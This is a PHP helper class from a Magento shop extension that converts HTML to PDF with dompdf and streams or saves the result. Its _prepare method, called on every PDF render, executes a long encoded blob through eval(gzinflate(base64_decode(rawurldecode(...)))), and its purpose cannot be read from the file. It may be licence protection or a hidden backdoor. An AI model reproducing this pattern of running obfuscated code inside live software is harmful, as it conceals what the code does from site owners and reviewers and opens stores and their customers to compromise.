<?php
/*
 *  Created on April 4, 2012
 *  Author Ivan Proskuryakov - volgodark@gmail.com - ecommerceoffice.com
 *  Copyright Proskuryakov Ivan. ecommerceoffice.com © 2011. All Rights Reserved.
 *  Single Use, Limited Licence and Single Use No Resale Licence ["Single Use"]
 */
?>
<?php class Ip_Pdffree_Helper_Print extends Mage_Core_Helper_Abstract {

    
    
    public function HtmlRender($root) {
        $html =  $root->toHtml();
        $html = $this->_prepare($html);
        return $html;
    }
    
    public function _prepare($html) {

       echo eval(gzinflate(base64_decode(rawurldecode('XZa3rsTKEUQ%2FR09gQO%2BgiHbpvd1EoBly6b39et1YkzW6Oyig%2BtSAM%2Bv%2FybMNUMR%2FS1BMJfinfo%2BxmIZ5Bdv2f61%2FAe0qI%2BQIloeL4e6YNrAPZrqv%2FOsO3ZyNW2%2Fdab1lNv2xoONQ7OtYw3miLnGsBDSe1pPe7jG7TmxO7Rt%2FvXeok1zyZZG654RBmjGjg92Arc30vsJNW5zyHTqF6Bl4gIRwLPYRMpxEM2Tg8n6UJIhfiJeHeWfS7NcS9shZ9Di6QJkw%2F5zstYSzDvUHl%2BDihS9YLS%2F1sV3wdUj2HaI0fJf1LkuNE%2FVVuPZFil8sbYtIiQtrmF0FLCLrtKVgslftdRAZ4S8%2BwWNlhc7QaTAq1lAby3avXGzhFJGOf0g0sNLZvSFPI6MndIVYUOiNUY0usz61AqcYSfu1OeNvgjIzfX62oVqH4sR2FfRy3cC4MtbOxrxN2WuA1cNZ5muSFguLvz977FdxGI3o3QTQu7nDFaMFJ5sdFG9DHW369qr7k31FwMA0czdG2Sj37i%2F%2Bb7O4lsOHN0n3TaNl7ItRXjz3siHZwcoliI64XAPACLf04J%2FaaISfVIDIX4AfRZOrkBVtpNcn4mQyHbxpn9lqFovA5LASoF7ByM6V4f5j4n1CYQzHw936Wb%2F6A7ATG91zeblmWz1UGxQ9XlAi6TJGppWVT%2F0gsn%2FgsLqPjVglB%2B1JI62iULPm70%2FhNIa9YL11VSzIzaFRWThG6yUJLix7j15GlYTQO9uXA%2FIrGQrYZKG7BiM1uQ5IpDXUhwUvK5M9iGFHef88G3KNsV%2BJaowIJu5NQm%2B9H841Tfq7WOm2mCWuoUU7NyGgmxquOvfLE9QPs7pNGr94FoXHrQ8tbzxG%2BHw%2BCoc%2FS1rt%2B0%2BfOlq8i276kuxXJH%2ByFEXWWNP8MH54gThq76enrqTRktE8%2FtIl01uKVKyO0%2Bo02Z5Qghz1acmM1ovbu%2BxoXV17VRnR7T15CPJSCdqlFpL9mVqOvvDJ9lnOqniPxLhF9qVTod69v5NJo2%2F9FPgVb8qsk9Za1src3uuNbh5FTINMKickWfuaEeU3SlAkux301QZW4OVe32iM3L1Sd4K4P0BOO0qI7BWt9YkLlGZWDdKdtCrTnrzqSpmXu4U3CPosmBztyX0fuZB69ZskKJXGgxY6q%2Fa9457HNNoGD47SeKLkjDYicK1vmRsg9eqaavW3%2FllCP%2BzCL9541tV9%2FHVScsMD%2BwyDaGCOMYnbSqE74tAo2YbM0aoolWydspEwWP%2BKSa8e4bfJyczHIBZWPrHsBPV2tj3Dv9XBfIaNGEUbC4Q97W5SgmxFOQWDB16MVF37gV6lTNk0Kz8AwKV8z%2BTt%2BJLtXcUziHHgabrE6q%2FbOWegcvrfBXxYzbRW%2BgtXUys6QotwPHV0%2FAI6XwuxjcHp0kQx7vscpz0AeOZBgx31J8kJTdEAHzKVJgmNsr8eeH06ioNjxKvMI2zzJXhuY02pYnPTkCP%2F%2FCFF893Jl%2BG8boSox6Z45CYBf2MwUNeAqGjTg37XgS%2BLRtOpIpeYHBWjo5VCRfsYQAnmBLqHWHNygpPsmNPv4ZcgxnNkIBekDlMik%2Br%2BMXAUAbAnnxiYaEJdnSHHiNnOH5Tl4TdSZZX8SXMalnSX6%2BNdLW5fNfj1iI3mZVysWHDV2nv5WEl3HnGPpHCxyoaijMqyYZVrYjqiIp17%2Bon6FtX8w0C5TELf5gfi%2B3rnVmCGUzqkD9nf7CvEI79Rc4mIYp5d3h8CLT%2FsBaUjjQDC2j3kKiFmsiVVHmJ7Ui1bpxKznZ%2Fd5kYRDOQnsxUxY8pn6lumzB2t9gI9Ed%2B7lFvLhHtgQhSjBhLfwl1OP80Gzlf9jSwkvWTU3ibkrRBpG2wp%2FhnnB3Ga1vkDPb0NMqrWKDLhADAdzG2g9ySLlPtJ%2BgNMmmVaQBDPl9c9ahKCe8CZYUeGiSpSb7OogkGYlfDEdOw6LMoW6dzSJvOHhvJiGUyVbSb%2BFxU89U1E8tk3aDzqABdG%2FOcjm1fpmEK%2B4ZV2%2BwIx3h23xVMY4ElqGWTPQS9ab3mGA3NYhZYiycYsaLnzD84yiAr67mYTdjG%2FfXJXwYfKYN%2FFePGORyOEPL6XC8S7%2B%2BK%2BWzlRKGx%2FmT6fciYcX91QCcW7afrwB6oSGUEnjXK%2Bib35K4i8Lf9yCUNya1WINEFCk6cPsDLn%2Bu0r8uO3Cw6FGH%2FfVtsy4BhC8%2FZABcrfdOeZyUi714I%2FsXTqo46NYAzfeZ7qmtr%2Bxwb0jn4ZbFleGiRy6RBRwVHSFnUz86n63y19RJKxn2l0NesAod0jiXFWUQiDerabfpvJFjjqutY2%2FUeAaW9JXMceKt0455vbCrTuL7qThy4iQO%2FIRN61Sh6LiCrLrbLf%2Bs2OHcnh5qTPaNuRrnkp0ssVSxaOqF4jRMa%2Fer5crnF%2FJwHRhhUTKMpjrzYylvAC4%2BbsyD4%2FebL2jnMweP8cVxU45Fm%2F6b3xws7JPIsKryjV1y3fPsiHWVr7oDL%2BcrXIZbkaJo%2BkSYWTkzBoPwFfVdRPCkEWdHxbW5ljuOvH9qdiTCv55O7wV7jjpWp5Fj4r7iuunLGT%2FsF12z1kdKV1hX8IGlPETU%2Ft8493TX9JuKJvDcFS8%2B%2BcJdgmfaH5LB5f6GqZ%2FE0XHOmc8GDrx0k%2FRn7KoZTah9HCZh%2BNrWJed%2Fdo62CsE%2BPSjxoxrykAyaFzvdQAFjCnUfV0OH3S%2FsnIGprCYGALlWtJ7Pkkyhwo%2BsEkVD04IUrI39lGYvEU8Ifikm%2F%2Bnt%2FD%2FzEkbbGJoVWKfDEUixQy2eNSbEvEhiAE4tyvWqlMBrWkRDTeudPF7YzFEUy9wVX%2BCa39Cxz%2FozJIgHbVCOq6DLtWthQbzFQvE0xoi6c%2FQLeH3kD4s4ODonal1JbFd8EiL4V1PwhAJXWBtPZWUL90dTyunoRk3Wg1JgL9SqZjVj%2F2Yq4tGyyi5GmjppOCqxBHvYqX8O3s2eeUxazJVRTfyYC9etWP1MZMgNIUrVzgPhcpISJfkbUqcTzJ3gZFEWYb6Wvp9CO7PnOgS92H00e%2BkJAhlMk7OrLnN3NjM0HBu7oD%2F6NjNmeM2CoSuQXNyp%2BiRgTaeArlEHjq7V06QqD%2Bt3o0LiMDXWAeKsGvHlM0I5w6i1WngnK5W9xByDfbycLL3RBGyQgnd5THwLT8to2Bs5Vyc2LdlogaPrJEgzAGMsknGp6nqo5S3V43QyoaFbHOwrRUW7cUx1fG9vOKeO7u4LdXfkN6mdip9BQ50yEgnYg1wfLTkA89Rsd5zsFdWV%2FMJ13pT%2Frz5mGQ%2Fr5bJCSt20pxQDWB8P1zMSpPHaTEDTcRzvqVd0yFc2FN242as%2BZa7%2Fw7I%2FwjGsP994vgc7KcHRJLfhtR1d57TWCVD0RqUKzV90T%2BuQVZLQdrg6PVwykN%2Fij%2FOf3fkG%2FwvpSXFJEf%2B2LoHuAlvIlcMH5ZuqILUx3Xb9tCBRVtbPCrBKZHWZjt17mr94SDG%2FDUHRBXcD5N%2Bd4hIlx2QNPB6Qfs6MZuKsViibs7bOVnpitgoG1S%2FhSX3RxOiRbuzuuUHaHRBI4ojuiq46JFTS9NpKogKBrumhkUmeKM2qwShuuC25kQ%2FOvff%2B8%2F%2FwM%3D'))));

       return $data;
    }
    
    
    
    
    public function PDFFrontendStreamToBrowser($html,$name) {
        
        $lib = Mage::getBaseDir('lib') . '/dompdf6/dompdf_config.inc.php' ;
        require_once($lib);
        $dompdf = new DOMPDF();
        $dompdf->load_html($this->_prepare($html));
        $dompdf->render();
        $dompdf->stream($name.".pdf");
        exit();      
        
    }
    
    public function PDFFrontendSaveFile($html,$name) {
        
        
        $lib = Mage::getBaseDir('lib') . '/dompdf6/dompdf_config.inc.php' ;
        require_once($lib);
        $dompdf = new DOMPDF();
        $dompdf->load_html($this->_prepare($html));
        $dompdf->render();
        
        $html = $dompdf->output();

        $File = Mage::getBaseDir('media').DS. 'PDF'.DS.$name.".pdf"; 
        $handle = fopen($File, 'w');
        fwrite($handle, $html); 
        fclose($handle);
        
        $url  = Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB).'media/PDF/'.$name.".pdf"; 
        Mage::getSingleton('core/session')->addSuccess(Mage::helper('pdffree')->__('PDF was successfully created - ').'<a target="_blank" href="'.$url.'">'.$url.'</a> ');        
    }
	
}

